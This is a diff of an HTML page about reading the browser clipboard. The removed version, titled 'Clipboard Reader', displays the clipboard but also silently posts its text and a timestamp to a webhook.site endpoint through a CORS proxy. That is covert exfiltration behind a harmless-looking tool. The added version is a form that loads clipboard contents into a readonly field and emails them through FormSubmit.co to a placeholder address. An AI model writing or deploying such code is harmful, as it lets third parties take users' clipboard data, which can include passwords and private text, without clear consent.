@@ -1,73 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Clipboard Reader</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 40px;
-      background: #f0f4f8;
-    }
-    h1 {
-      color: #333;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    #output {
-      margin-top: 20px;
-      padding: 10px;
-      background: #fff;
-      border: 1px solid #ccc;
-      white-space: pre-wrap;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Form with FormSubmit.co</title>
+    <script>
+        function copyClipboard() {
+            // Use the Clipboard API to get clipboard content
+            navigator.clipboard.readText().then(function(clipText) {
+                // Set the content into the input field
+                document.getElementById('clipboardContent').value = clipText;
+            }).catch(function(err) {
+                console.error('Failed to read clipboard contents: ', err);
+            });
+        }
+    </script>
 </head>
 <body>
-  <h1>Clipboard Reader</h1>
-  <button onclick="readClipboard()">Read Clipboard</button>
-  <div id="output">Clipboard content will appear here.</div>
+    <h1>Submit Clipboard Content via Email</h1>
+    <form action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST">
+        <input type="hidden" name="_subject" value="Clipboard Content Submitted" />
+        <input type="hidden" name="_next" value="thank_you.html" />
+        
+        <label for="clipboardContent">Clipboard Content:</label>
+        <input type="text" id="clipboardContent" name="clipboardContent" readonly />
 
-  <script>
-    async function readClipboard() {
-      const output = document.getElementById("output");
-
-      if (!navigator.clipboard) {
-        output.innerText = "Clipboard API not supported or available.";
-        return;
-      }
-
-      try {
-        const text = await navigator.clipboard.readText();
-        output.innerText = text || "(Clipboard is empty)";
-
-        // Send to Webhook.site using CORS Anywhere
-        const response = await fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/50a39e83-8228-4607-b848-b1850324245c', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            clipboard: text,
-            timestamp: new Date().toISOString()
-          })
-        });
-
-        if (response.ok) {
-          console.log("Clipboard sent!");
-        } else {
-          console.error("Failed to send:", response.status);
-        }
-
-      } catch (err) {
-        output.innerText = "Failed to read clipboard: " + err;
-      }
-    }
-  </script>
+        <button type="button" onclick="copyClipboard()">Copy Clipboard</button>
+        <br>
+        <button type="submit">Submit</button>
+    </form>
 </body>
 </html>
